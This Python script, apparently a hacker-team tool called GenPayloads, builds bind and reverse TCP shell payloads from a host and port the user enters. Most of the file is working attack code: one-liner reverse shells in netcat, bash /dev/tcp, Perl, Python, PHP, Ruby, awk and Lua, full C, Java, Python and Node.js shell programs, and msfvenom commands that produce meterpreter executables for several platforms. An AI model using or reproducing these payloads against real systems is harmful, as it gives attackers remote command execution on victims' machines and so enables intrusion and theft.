#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import os
import sys
import time
import platform
import readline

readline.parse_and_bind('tab: complete')

class GenPayloads:
	def __init__(self):
		self.payload = ''
		
		self.s = '\033[1;32m[+]\033[m'
		self.e = '\033[1;31m[-]\033[m'
		self.p = '\033[1;34m[*]\033[m'
		self.i = '\033[1;35m[!]\033[m'

		self.c_gen = '\033[1;37m[\033[1;31mgenpayloads\033[1;37m]:\033[1;35m$\033[m '
		self.c_bind = '\033[1;37m[\033[1;31mgenpayloads\033[1;37m]-[\033[1;36mbind_tcp\033[1;37m]:\033[1;35m$\033[m '
		self.c_reverse = '\033[1;37m[\033[1;31mgenpayloads\033[1;37m]-[\033[1;90mreverse_tcp\033[1;37m]:\033[1;35m$\033[m '

		self.c_lhost = '\033[1;37m[\033[1;31mgenpayloads\033[1;37m]-[\033[1;32mlhost\033[1;37m]:\033[1;35m$\033[m '
		self.c_lport = '\033[1;37m[\033[1;31mgenpayloads\033[1;37m]-[\033[1;33mlport\033[1;37m]:\033[1;35m$\033[m '


	def clear_screen(self):
		if platform.system() == 'Windows':
			os.system('cls')
		else:
			os.system('clear')

	def save_payloads(self, name, payload):
		print()
		print(self.p, 'Saving payload...')
		time.sleep(1)
		try:
			path = './payloads/' + name
			with open(path, 'w') as file:
				file.write(str(payload))
			file.close()
		except Exception as e:
			print(self.e, str(e))
			return False
		else:
			print(self.i, 'Payload Saved Successfully in \033[1;33m' + path + '\033[m')
			return True

	#Bind TCP Shell ###########

	#CMD

	def cmd_nc_bind_tcp(self, lport):
		"""CMD Traditional Netcat Bind TCP"""
		self.payload = f'/bin/nc -lvp {lport} -e /bin/bash'
		return self.payload

	def cmd_nc_bsd_bind_tcp(self, lport):
		"""CMD Netcat OpenBSD Bind TCP"""
		self.payload = f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp {lport} >/tmp/f'
		return self.payload

	def cmd_perl_bind_tcp(self, lport):
		"""CMD Perl Bind TCP"""
		self.payload = f'''perl -e 'use Socket;$lport={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S, sockaddr_in($lport, INADDR_ANY));listen(S, SOMAXCONN);for(;$lport=accept(C,S);close C)'''
		self.payload += '{open(STDIN, ">&C");open(STDOUT, ">&C");open(STDERR, ">&C");exec("/bin/bash -i");'
		self.payload += "};'"		
		return self.payload

	def cmd_python_bind_tcp(self, lport):
		"""CMD Python Bind TCP"""
		self.payload = "python -c '"
		self.payload += f'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1);s.bind(("0.0.0.0",{lport}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])'
		self.payload += "'"
		return self.payload

	# Cods

	def python_bind_tcp(self, lport):
		"""Python Bind TCP"""
		self.payload = f'''import os
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', int({lport}))
s.listen(1)

conn, addr = s.accept()

os.dup2(conn.fileno(), 0)
os.dup2(conn.fileno(), 1)
os.dup2(conn.fileno(), 2)

p=subprocess.call(['/bin/sh', '-i'])'''
		return self.payload

	def c_bind_tcp(self, lport):
		"""C Bind TCP"""
		self.payload = '''#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>

int main(void){
	int mysocket, newsocket;
	'''
		self.payload += f'int port = {lport};'
		self.payload += '''
	
	struct sockaddr_in local;
	struct sockaddr_in remote;
	socklen_t client_size;

	mysocket = socket(AF_INET, SOCK_STREAM, 0);
	if(mysocket < 0){
		perror("Socket");
		exit(errno);
	}

	local.sin_family = AF_INET;
	local.sin_port = htons(port);
	local.sin_addr.s_addr = INADDR_ANY;
	bzero(&(local.sin_zero), 8);

	if(bind(mysocket, (struct sockaddr *)&local, sizeof(local)) < 0){
		perror("Bind");
		exit(errno);
	}

	if(listen(mysocket, 1) < 0){
		perror("Listen");
		exit(errno);
	}

	client_size = sizeof(struct sockaddr_in);

	while(1){
		if((newsocket = accept(mysocket, (struct sockaddr *)&remote, &client_size)) < 0){
			perror("Accept");
			exit(errno);
		}else{
			close(0);close(1);close(2);
			dup2(newsocket,0);dup2(newsocket,1);dup2(newsocket,3);
			char * const argv[] = {"/bin/sh", NULL};
    		execve("/bin/sh", argv, NULL);
			close(newsocket);
			exit(0);
		}
	}
	close(mysocket);

	return 0;
}'''
		return self.payload

	# MSFVenom Bind TCP #######

	def cmd_msfvenom_bind_tcp(self, lport):
		"""CMD MSFvenom Bind TCP"""
		self.payload = f'''msfvenom -p cmd/unix/bind_awk LPORT={lport}
msfvenom -p cmd/unix/bind_nodejs LPORT={lport}
msfvenom -p cmd/unix/bind_awk LPORT={lport}
msfvenom -p cmd/unix/bind_perl LPORT={lport}
msfvenom -p cmd/unix/bind_ruby LPORT={lport}
msfvenom -p cmd/unix/bind_r LPORT={lport}
msfvenom -p cmd/unix/bind_zsh LPORT={lport}
msfvenom -p cmd/windows/bind_lua LPORT={lport}
msfvenom -p cmd/windows/bind_perl LPORT={lport}
msfvenom -p cmd/windows/bind_ruby LPORT={lport}
msfvenom -p generic/shell_bind_tcp LPORT={lport}'''
		return self.payload

	def msfvenom_bind_tcp(self, lport):
		"""MSFvenom Bind TCP"""
		self.payload = f'''[*.jar]
msfvenom -p java/shell/bind_tcp LPORT={lport} -f jar > shell.jar
msfvenom -p java/meterpreter/bind_tcp LPORT={lport} -f jar > shell.jar

[*.elf]
msfvenom -p linux/mipsle/shell_bind_tcp LPORT={lport} -f elf > shell.elf
msfvenom -p linux/armle/shell_bind_tcp LPORT={lport} -f elf > shell.elf
msfvenom -p linux/armle/shell/bind_tcp LPORT={lport} -f elf > shell.elf
msfvenom -p linux/x64/meterpreter/bind_tcp LPORT={lport} -f elf > shell.elf
msfvenom -p linux/x64/shell_bind_tcp LPORT={lport} -f elf > shell.elf
msfvenom -p linux/x86/meterpreter/bind_tcp LPORT={lport} -f elf > shell.elf
msfvenom -p linux/x86/shell/bind_tcp LPORT={lport} -f elf > shell.elf
msfvenom -p linux/x86/shell_bind_tcp LPORT={lport} -f elf > shell.elf

[*.js]
msfvenom -p nodejs/shell_bind_tcp LPORT={lport} -f raw > shell.js

[*.macho]
msfvenom -p osx/armle/shell/bind_tcp LPORT={lport} -f macho > shell.macho
msfvenom -p osx/x64/meterpreter/bind_tcp LPORT={lport} -f macho > shell.macho
msfvenom -p osx/x64/shell_bind_tcp LPORT={lport} -f macho > shell.macho

[*.php]
msfvenom -p php/bind_perl LPORT={lport} -f raw > shell.php
msfvenom -p php/meterpreter/bind_tcp LPORT={lport} -f raw > shell.php

[*.python]
msfvenom -p python/meterpreter/bind_tcp LPORT={lport} -f python > shell.py
msfvenom -p python/meterpreter_bind_tcp LPORT={lport} -f python > shell.py

[*.ruby]
msfvenom -p ruby/shell_bind_tcp LPORT={lport} -f ruby > shell.rb

[*.exe]
msfvenom -a x86 --platform windows -p windows/meterpreter/bind_tcp LPORT={lport} -f exe -o shell.exe
msfvenom -a x64 --platform windows -p windows/x64/meterpreter_bind_tcp LPORT={lport} -f exe -o shell.exe'''
		return self.payload

	###########################

	# Reverse TCP Shell #######

	# CMD

	def cmd_nc_reverse_tcp(self, lhost, lport):
		"""CMD Traditional Netcat Reverse TCP"""
		self.payload = f'/bin/nc -e /bin/sh {lhost} {lport}'
		return self.payload

	def cmd_nc_bsd_reverse_tcp(self, lhost, lport):
		"""CMD Netcat OpenBSD Reverse TCP"""
		self.payload = f'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f'
		return self.payload

	def cmd_bash_reverse_tcp(self, lhost, lport):
		"""CMD Bash Reverse TCP"""
		self.payload = f'sh -i >& /dev/tcp/{lhost}/{lport} 0>&1'
		return self.payload

	def cmd_perl_reverse_tcp(self, lhost, lport):
		"""CMD Perl Reverse TCP"""
		self.payload = "perl -e '"
		self.payload += f'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))'
		self.payload += '{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
		self.payload += "'"
		return self.payload

	def cmd_python_reverse_tcp(self, lhost, lport):
		"""CMD Python Reverse TCP"""
		self.payload = "python -c '"
		self.payload += f'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
		self.payload += "'"
		return self.payload

	def cmd_php_reverse_tcp(self, lhost, lport):
		"""CMD PHP Reverse TCP"""
		self.payload = "php -r '"
		self.payload += f'$sock=fsockopen("{lhost}",{lport});shell_exec("/bin/sh -i <&3 >&3 2>&3");'
		self.payload += "'"
		return self.payload

	def cmd_ruby_reverse_tcp(self, lhost, lport):
		"""CMD Ruby Reverse TCP"""
		self.payload = "ruby -rsocket -e '"
		self.payload += f'exit if fork;c=TCPSocket.new("{lhost}","{lport}");while(cmd=c.gets);IO.popen(cmd,"r")'
		self.payload += '{|io|c.print io.read}end'
		self.payload += "'"
		return self.payload

	def cmd_awk_reverse_tcp(self, lhost, lport):
		"""CMD Awk Reverse TCP"""
		self.payload = "awk '"
		self.payload += 'BEGIN {s = '
		self.payload += f'"/inet/tcp/0/{lhost}/{lport}"; while(42) '
		self.payload += "{ do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}'"
		self.payload += ' /dev/null'
		return self.payload

	def cmd_lua_reverse_tcp(self, lhost, lport):
		"""CMD Lua Reverse TCP"""
		self.payload = 'lua -e "require'
		self.payload += f"('socket');require('os');t=socket.tcp();t:connect('{lhost}','{lport}');"
		self.payload += 'os.execute(\'/bin/sh -i <&3 >&3 2>&3\');"'
		return self.payload

	# Cods

	def simple_java_lin_reverse_tcp(self, lhost, lport):
		"""Simple Java Linux Reverse TCP"""
		self.payload = 'Runtime r = Runtime.getRuntime();'
		self.payload += 'Process p = r.exec("/bin/bash -c \'exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done\'");'
		self.payload += 'p.waitFor();'
		return self.payload

	def java_win_reverse_tcp(self, lhost, lport):
		"""Java Windows Reverse TCP"""
		self.payload = f'String host="{lhost}";int port={lport};'
		self.payload += 'String cmd="cmd.exe";'
		self.payload += 'Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();'
		return self.payload

	def python_reverse_tcp(self, lhost, lport):
		"""Python Reverse TCP"""
		self.payload = f'''import os
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('{lhost}', int({lport}))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

p=subprocess.call(['/bin/sh', '-i'])'''
		return self.payload

	def c_reverse_tcp(self, lhost, lport):
		"""C Reverse TCP"""
		self.payload = '''#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
	int mysocket, conecta;
	'''
		self.payload += f'char ip[]="{lhost}";'
		self.payload += f'int port = {lport};'
		self.payload += '''

	struct sockaddr_in server;
	
	mysocket = socket(AF_INET, SOCK_STREAM, 0);
	if(mysocket < 0){
		perror("Socket");
		exit(errno);
	}

	server.sin_family = AF_INET;
	server.sin_port = htons(port);
	server.sin_addr.s_addr = inet_addr(ip);
	bzero(&(server.sin_zero), 8);

	conecta = connect(mysocket, (struct sockaddr *)&server, sizeof(server));
	if(conecta < 0){
		perror("Connect");
		exit(errno);
	}

	close(0);close(1);close(2);
	dup2(mysocket,0);dup2(mysocket,1);dup2(mysocket,3);
	char * const argv[] = {"/bin/sh", NULL};
	execve("/bin/sh", argv, NULL);
	close(mysocket);

	return 0;
}'''
		return self.payload


	def nodejs_reverse_tcp(self, lhost, lport):
		"""NodeJs Reverse TCP"""
		self.payload = '''(function(){
	var net = require("net"),
	cp = require("child_process"),
	sh = cp.spawn("/bin/sh", []);
	var client = new net.Socket();
    	'''

		self.payload += f'client.connect({lport}, "{lhost}", function()'
		self.payload += '''{
		client.pipe(sh.stdin);
		sh.stdout.pipe(client);
		sh.stderr.pipe(client);
	});
    	return /a/; // Prevents the Node.js application form crashing

})();'''
		return self.payload

	# MSFVenom Reverse TCP ####

	def msfvenom_reverse_tcp(self, lhost, lport):
		"""MSFvenom Reverse TCP"""
		self.payload = f'''[*.elf]
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell.elf
msfvenom -p linux/x86/shell/reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell.elf

[*.exe]
msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell.exe
msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o shell.exe

[*.apk]: msfvenom -p android/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -o app.apk

[*.macho]: msfvenom -p osx/x86/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell.macho

[*.asp]: msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f asp > shell.asp

[*.jsp]: msfvenom -p java/jsp_shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f raw > shell.jsp

[*.war]: msfveno -p java/jsp_shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f war > shell.war

[*.py]: msfvenom -p cmd/unix/reverse_python LHOST="{lhost}" LPORT={lport} -f raw > shell.py

[*.sh]: msfvenom -p cmd/unix/reverse_bash LHOST="{lhost}" LPORT={lport} -f raw > shell.sh

[*.pl]: msfvenom -p cmd/unix/reverse_perl LHOST="{lhost}" LPORT={lport} -f raw > shell.pl

[*.php]: msfvenom -p php/meterpreter_reverse_tcp LHOST="{lhost}" LPORT={lport} -f raw > shell.php'''
		return self.payload

	###########################

	## Banners ###############

	def reverse_tcp(self):
		self.clear_screen()
		print('''\033[1;33m 			»»» v1.0
 ___                                 _____ ___ ___         ___ _  _     _ _ 
| _ \_____ _____ _ _ ___ ___   ___  |_   _/ __| _ \  ___  / __| || |___| | |
|   / -_) V / -_) '_(_-</ -_) |___|   | || (__|  _/ |___| \__ \ __ / -_) | |
|_|_\___|\_/\___|_| /__/\___|         |_| \___|_|         |___/_||_\___|_|_|	»»

	\033[1;37m--[ \033[1;37mGenerate \033[1;33mReverse TCP\033[1;37m Shell's\033[1;33m...
	
    	\033[1;37m--[ \033[1;31mCoded by : N3utr0n							»»»
 ««    	\033[1;37m--[ \033[1;32mTeam : FHC - FR13NDs Hackers Club
    	\033[1;37m--[ \033[1;33mDate : 04/04/2022
 »»    	\033[1;37m--[ \033[1;34mFacebook : https://www.facebook.com/miraldino.paulo.7	««
		''')
		text = self.p+' \033[1;37mCreate Payloads for \033[1;33mReverse TCP\033[1;37m Shell\033[1;33m...\033[m'
		for txt in text:
			sys.stdout.write(txt)
			sys.stdout.flush()
			time.sleep(0.1)
		time.sleep(1)

	def menu_reverse_tcp(self):
		time.sleep(0.5)
		self.clear_screen()
		print('''
		\033[1;36m====== \033[1;33mReverse Shell TCP \033[1;36m======\033[m

\033[1;31m--[ Command Line (CMD)\t\t\033[1;31m |\t\033[1;32m--[ Source Code's
\t\t\t\t\033[1;31m |
\033[1;37m[1]. Netcat Reverse TCP\t\t\033[1;31m |\t\033[1;37m[10]. Simple Java Linux Reverse TCP
\033[1;37m[2]. Netcat OpenBSD Reverse TCP \033[1;31m |\t\033[1;37m[11]. Java Windows Reverse TCP
\033[1;37m[3]. Bash Reverse TCP\t\t\033[1;31m |\t\033[1;37m[12]. C Reverse TCP
\033[1;37m[4]. Perl Reverse TCP\t\t\033[1;31m |\t\033[1;37m[13]. Python Reverse TCP
\033[1;37m[5]. Python Reverse TCP\t\t\033[1;31m |\t\033[1;37m[14]. NodeJs Reverse TCP
\033[1;37m[6]. PHP Reverse TCP\t\t\033[1;31m |
\033[1;37m[7]. Ruby Reverse TCP\t\t\033[1;31m |\t\033[1;33m--[ MSFVenom
\033[1;37m[8]. Awk Reverse TCP\t\t\033[1;31m |
\033[1;37m[9]. Lua Reverse TCP\t\t\033[1;31m |\t\033[1;37m[15]. MSFVenom Reverse TCP
\t\t\t\t\033[1;31m |
\t\t\t\t\033[1;31m |\t\033[1;36m--Program
\t\t\t\t\033[1;31m |
\t\t\t\t\033[1;31m |\t\033[1;37m[88]. Back
\t\t\t\t\033[1;31m |\t\033[1;37m[99]. Exit

		\033[1;36m===============================\033[m
		''')
		rv_tcp = int(input(self.c_reverse))
		if rv_tcp == 1:
			lhost = input(self.c_lhost)
			lport = int(input(self.c_lport))
			payload = self.cmd_nc_reverse_tcp(lhost, lport)
		elif rv_tcp == 2:
			lhost = input(self.c_lhost)
			lport = int(input(self.c_lport))
			payload = self.cmd_nc_bsd_reverse_tcp(lhost, lport)
		elif rv_tcp == 3:
			lhost = input(self.c_lhost)
			lport = int(input(self.c_lport))
			payload = self.cmd_bash_reverse_tcp(lhost, lport)
		elif rv_tcp == 4:
			lhost = input(self.c_lhost)
			lport = int(input(self.c_lport))
			payload = self.cmd_perl_reverse_tcp(lhost, lport)
		elif rv_tcp == 5:
			lhost = input(self.c_lhost)
			lport = int(input(self.c_lport))
			payload = self.cmd_python_reverse_tcp(lhost, lport)
		elif rv_tcp == 6:
			lhost = input(self.c_lhost)
			lport = int(input(self.c_lport))
			payload = self.cmd_php_reverse_tcp(lhost, lport)
		elif rv_tcp == 7:
			lhost = input(self.c_lhost)
			lport = int(input(self.c_lport))
			payload = self.cmd_ruby_reverse_tcp(lhost, lport)
		elif rv_tcp == 8:
			lhost = input(self.c_lhost)
			lport = int(input(self.c_lport))
			payload = self.cmd_awk_reverse_tcp(lhost, lport)
		elif rv_tcp == 9:
			lhost = input(self.c_lhost)
			lport = int(input(self.c_lport))
			payload = self.cmd_lua_reverse_tcp(lhost, lport)
		elif rv_tcp == 10:
			lhost = input(self.c_lhost)
			lport = int(input(self.c_lport))
			payload = self.simple_java_lin_reverse_tcp(lhost, lport)
		elif rv_tcp == 11:
			lhost = input(self.c_lhost)
			lport = int(input(self.c_lport))
			payload = self.java_win_reverse_tcp(lhost, lport)
		elif rv_tcp == 12:
			lhost = input(self.c_lhost)
			lport = int(input(self.c_lport))
			payload = self.c_reverse_tcp(lhost, lport)
		elif rv_tcp == 13:
			lhost = input(self.c_lhost)
			lport = int(input(self.c_lport))
			payload = self.python_reverse_tcp(lhost, lport)
		elif rv_tcp == 14:
			lhost = input(self.c_lhost)
			lport = int(input(self.c_lport))
			payload = self.nodejs_reverse_tcp(lhost, lport)
		elif rv_tcp == 15:
			lhost = input(self.c_lhost)
			lport = int(input(self.c_lport))
			payload = self.msfvenom_reverse_tcp(lhost, lport)
		elif rv_tcp == 88:
			self.program()
		elif rv_tcp == 99:
			print()
			print(self.p, '\033[1;37mExiting program\033[1;33m...')
			time.sleep(1)
			sys.exit(0)
		else:
			print()
			print(self.e, f'Option {rv_tcp} not found\n')
			input(self.p+' Press Enter for continue...')
			self.menu_reverse_tcp()

		print()
		print(self.p, 'Generate Payload...')
		time.sleep(3)
		print(self.s, 'Payload Generate Successfully.\033[1;32m\n')
		time.sleep(0.6)
		print(payload)
		self.save_payloads('reverse_tcp.txt', payload)
		print()
		print(self.i, 'Good lock...')
		input(self.p+' Press Enter for continue...')
		self.menu_reverse_tcp()


	def bind_tcp(self):
		self.clear_screen()
		print('''\033[1;31m
 ____  _           _           _____ ____ ____            ____  _          _ _ 
| __ )(_)_ __   __| |         |_   _/ ___|  _ \          / ___|| |__   ___| | |
|  _ \| | '_ \ / _` |  _____    | || |   | |_) |  _____  \___ \| '_ \ / _ \ | |
| |_) | | | | | (_| | |_____|   | || |___|  __/  |_____|  ___) | | | |  __/ | |
|____/|_|_| |_|\__,_|           |_| \____|_|             |____/|_| |_|\___|_|_|\033[m
 
 [ \033[1;35mv1.0\033[m ]

	\033[1;33m--[ \033[1;37mGenerate \033[1;36mBind TCP\033[1;37m Shell's\033[1;33m...
	
    	\033[1;33m--[ \033[1;31mCoded by : N3utr0n							*
 *    	\033[1;33m--[ \033[1;32mTeam : FHC - FR13NDs Hackers Club
    	\033[1;33m--[ \033[1;33mDate : 04/04/2022
    	\033[1;33m--[ \033[1;34mFacebook : https://www.facebook.com/miraldino.paulo.7
		''')
		text = self.p+' \033[1;37mCreate Payloads for \033[1;36mBind TCP\033[1;37m Shell\033[1;33m...\033[m'
		for txt in text:
			sys.stdout.write(txt)
			sys.stdout.flush()
			time.sleep(0.1)
		time.sleep(1)

	def menu_bind_tcp(self):
		time.sleep(0.5)
		self.clear_screen()
		print('''
			\033[1;33m==== \033[1;36mBind Shell TCP \033[1;33m=====\033[m


\033[1;31m-[ Command Line (CMD)\t\t\033[1;31m|\033[m\t\033[1;33m-[ MSFVenom
\t\t\t\t\033[1;31m|\033[m
\033[1;37m[1]. Netcat Bind TCP\t\t\033[1;31m|\t\033[1;37m[7]. CMD MSFVenom Bind TCP
\033[1;37m[2]. Netcat OpenBSD Bind TCP \t\033[1;31m|\t\033[1;37m[8]. MSFVenom Bind TCP
\033[1;37m[3]. Perl Bind TCP\t\t\033[1;31m|\033[m
\033[1;37m[4]. Python Bind TCP\t\t\033[1;31m|\033[m\t\033[1;36m-[ Program
\t\t\t\t\033[1;31m|\033[m
\033[1;32m-[ Source Code's\t\t\033[1;31m|\t\033[1;37m[88]. Back
\t\t\t\t\033[1;31m|\t\033[1;37m[99]. Exit
\033[1;37m[5]. Python Bind TCP\t\t\033[1;31m|\033[m
\033[1;37m[6]. C Bind TCP\t\t\t\033[1;31m|\033[m

			\033[1;33m=========================\033[m
		''')
		b_tcp = int(input(self.c_bind))
		if b_tcp == 1:
			lport = int(input(self.c_lport))
			payload = self.cmd_nc_bind_tcp(lport)
		elif b_tcp == 2:
			lport = int(input(self.c_lport))
			payload = self.cmd_nc_bsd_bind_tcp(lport)
		elif b_tcp == 3:
			lport = int(input(self.c_lport))
			payload = self.cmd_perl_bind_tcp(lport)
		elif b_tcp == 4:
			lport = int(input(self.c_lport))
			payload = self.cmd_python_bind_tcp(lport)
		elif b_tcp == 5:
			lport = int(input(self.c_lport))
			payload = self.python_bind_tcp(lport)
		elif b_tcp == 6:
			lport = int(input(self.c_lport))
			payload = self.c_bind_tcp(lport)
		elif b_tcp == 7:
			lport = int(input(self.c_lport))
			payload = self.cmd_msfvenom_bind_tcp(lport)
		elif b_tcp == 8:
			lport = int(input(self.c_lport))
			payload = self.msfvenom_bind_tcp(lport)
		elif b_tcp == 88:
			self.program()
		elif b_tcp == 99:
			print()
			print(self.p, '\033[1;37mExiting program\033[1;33m...')
			time.sleep(1)
			sys.exit(0)
		else:
			print()
			print(self.e, f'Option {b_tcp} not found\n')
			input(self.p+' Press Enter for continue...')
			self.menu_bind_tcp()

		print()
		print(self.p, 'Generate Payload...')
		time.sleep(3)
		print(self.s, 'Payload Generate Successfully.\033[1;32m\n')
		time.sleep(0.6)
		print(payload)
		self.save_payloads('bind_tcp.txt', payload)
		print()
		print(self.i, 'Good lock...')
		input(self.p+' Press Enter for continue...')
		self.menu_bind_tcp()


	##########################

	def program(self):
		self.clear_screen()
		print('''\033[1;37m
			*							*
  _____            _____            _                 _     *
 / ____|          |  __ \          | |               | |    
| |  __  ___ _ __ | |__) |_ _ _   _| | ___   __ _  __| |___ 
| | |_ |/ _ \ '_ \|  ___/ _` | | | | |/ _ \ / _` |/ _` / __|		*
| |__| |  __/ | | | |  | (_| | |_| | | (_) | (_| | (_| \\__ \\
 \\_____|\\___|_| |_|_|   \\__,_|\__, |_|\___/ \__,_|\__,_|___/
                               __/ |                        
                              |___/       				v1.0 *\033[m
*
    \033[1;36m--[ \033[1;37mGenPayloads \033[1;31ma.k.a\033[m \033[1;33mGenerate Payloads 	*

    	\033[1;36m--[ \033[1;31mCoded by : N3utr0n							*
 *    	\033[1;36m--[ \033[1;32mTeam : FHC - FR13NDs Hackers Club
    	\033[1;36m--[ \033[1;33mDate : 04/04/2022
    	\033[1;36m--[ \033[1;34mFacebook : https://www.facebook.com/miraldino.paulo.7

			
  \033[1;36m======= \033[1;37mGenerate Payloads\033[m \033[1;36m=======\033[m

	\033[1;37m[1]. \033[1;31mBind Shell TCP
	\033[1;37m[2]. \033[1;32mReverse Shell TCP
	\033[1;37m[99]. \033[1;33mExit

  \033[1;36m=================================\033[m
		''')
		while True:
			try:
				command = int(input(self.c_gen))
				if command == 1:
					self.bind_tcp()
					self.menu_bind_tcp()
				elif command == 2:
					self.reverse_tcp()
					self.menu_reverse_tcp()
				elif command == 99:
					print()
					print(self.p, '\033[1;37mExiting program\033[1;33m...')
					time.sleep(1)
					sys.exit(0)
				else:
					print(self.e, f'Option {command} not found\n')
			except KeyboardInterrupt:
				print('\n')
				print(self.e, '\033[1;32mCTRL + C\033[1;37m - \033[1;33mDetected\033[1;37m...\033[m')
				print(self.i, '\033[1;36mWrite \033[1;31m"99"\033[1;36m for exit.\033[m\n')
			except Exception as e:
				print(self.e, str(e))
				time.sleep(2)
				self.program()
				#return False

if __name__ == '__main__':
	genpayloads = GenPayloads()
	genpayloads.program()